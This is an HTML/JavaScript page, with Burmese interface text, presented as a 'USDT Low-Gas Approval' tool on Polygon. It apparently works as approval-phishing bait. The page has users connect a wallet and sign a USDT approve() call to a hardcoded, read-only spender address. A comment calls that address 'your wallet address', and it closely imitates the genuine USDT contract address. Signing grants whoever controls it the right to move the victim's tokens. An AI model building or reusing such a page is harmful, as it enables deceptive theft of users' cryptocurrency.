<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Low-Gas Approval App</title>
    <!-- Tailwind CSS for UI styling -->
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <!-- Ethers.js v6 -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
</head>
<body class="bg-slate-900 text-white min-h-screen flex items-center justify-center p-4">

    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-md border border-slate-700">
        <h1 class="text-xl font-bold mb-4 text-center text-emerald-400">USDT Low-Gas Approval</h1>
        <p class="text-xs text-slate-400 mb-6 text-center">Polygon Network ကိုအသုံးပြု၍ Gas fee အနည်းဆုံးဖြင့် Approve လုပ်မည်။</p>

        <!-- Wallet Connection Status -->
        <div class="mb-4">
            <button id="connectBtn" onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 px-4 rounded-xl transition duration-200 cursor-pointer">
                Connect Wallet
            </button>
            <p id="walletAddress" class="text-xs text-slate-400 mt-2 text-center truncate"></p>
        </div>

        <!-- Approval Form -->
        <div class="space-y-4">
            <div>
                <label class="block text-xs font-medium text-slate-300 mb-1">Spender Contract Address (လက်ခံမည့်သူ/အဓိကလိပ်စာ)</label>
                <!-- သင့်ရဲ့ Wallet Address ကို ဤနေရာတွင် Hardcode ထည့်သွင်းထားသည် (readOnly ဖြင့် ပြင်လို့မရအောင် ကာကွယ်ထားသည်) -->
                <input type="text" id="spenderAddress" value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F" readonly class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-400 select-all cursor-not-allowed">
            </div>

            <div>
                <label class="block text-xs font-medium text-slate-300 mb-1">Amount (USDT ပမာဏ)</label>
                <input type="number" id="amount" placeholder="ဥပမာ - 10" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
            </div>

            <button id="approveBtn" onclick="approveUSDT()" disabled class="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 disabled:text-slate-500 font-semibold py-2.5 px-4 rounded-xl transition duration-200 cursor-pointer">
                Approve USDT
            </button>
        </div>

        <div id="statusLog" class="mt-4 text-xs text-center text-amber-400 font-mono"></div>
    </div>

    <script>
        let provider;
        let signer;
        let userAddress;

        // Polygon Network Config
        const POLYGON_CHAIN_ID = "0x89"; // 137 in decimal
        const USDT_POLYGON_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e2f";
        
        // Minimal ERC20 ABI for approve
        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) public returns (bool)"
        ];

        async function connectWallet() {
            if (typeof window.ethereum === "undefined") {
                alert("ကျေးဇူးပြု၍ MetaMask သို့မဟုတ် Web3 Supported Wallet ကို Install လုပ်ပါ။");
                return;
            }

            try {
                provider = new ethers.BrowserProvider(window.ethereum);
                const accounts = await provider.send("eth_requestAccounts", []);
                userAddress = accounts[0];

                await switchToPolygon();
                signer = await provider.getSigner();

                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                document.getElementById("connectBtn").innerText = "Connected";
                document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
                document.getElementById("approveBtn").removeAttribute("disabled");
                
                document.getElementById("statusLog").innerText = "Polygon Network သို့ အောင်မြင်စွာ ချိတ်ဆက်ပြီးပါပြီ။";
            } catch (error) {
                console.error(error);
                document.getElementById("statusLog").innerText = "Wallet ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
            }
        }

        async function switchToPolygon() {
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: POLYGON_CHAIN_ID }],
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [{
                                chainId: POLYGON_CHAIN_ID,
                                chainName: "Polygon Mainnet",
                                rpcUrls: ["https://polygon-rpc.com/"],
                                blockExplorerUrls: ["https://polygonscan.com/"],
                                nativeCurrency: {
                                    name: "POL",
                                    symbol: "POL",
                                    decimals: 18
                                }
                            }],
                        });
                    } catch (addError) {
                        throw new Error("Polygon Network ထည့်သွင်းခြင်း မအောင်မြင်ပါ။");
                    }
                } else {
                    throw switchError;
                }
            }
        }

        async function approveUSDT() {
            // HTML ထဲတွင် သတ်မှတ်ထားသော Spender Address ကို တိုက်ရိုက်ယူမည်
            const spender = document.getElementById("spenderAddress").value.trim();
            const rawAmount = document.getElementById("amount").value.trim();
            const logElement = document.getElementById("statusLog");

            if (!ethers.isAddress(spender)) {
                alert("မှန်ကန်သော Spender Address ထည့်သွင်းထားခြင်း မရှိပါ။");
                return;
            }

            if (!rawAmount || isNaN(rawAmount) || Number(rawAmount) <= 0) {
                alert("မှန်ကန်သော USDT ပမာဏ ထည့်ပါ။");
                return;
            }

            try {
                logElement.innerText = "Transaction တင်နေပါသည်... ကျေးဇူးပြု၍ စောင့်ပါ။";
                
                const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, signer);
                const parsedAmount = ethers.parseUnits(rawAmount, 6);

                const tx = await usdtContract.approve(spender, parsedAmount);
                logElement.innerText = `Tx တင်ပြီးပါပြီ။ အတည်ပြုချက် စောင့်ဆိုင်းနေသည်...`;

                const receipt = await tx.wait();
                logElement.innerText = `အောင်မြင်ပါသည်! Block: ${receipt.blockNumber}`;
            } catch (error) {
                console.error(error);
                logElement.innerText = `Approval ပျက်ပြားသွားပါပြီ: ${error.reason || error.message}`;
            }
        }
    </script>
</body>
</html>
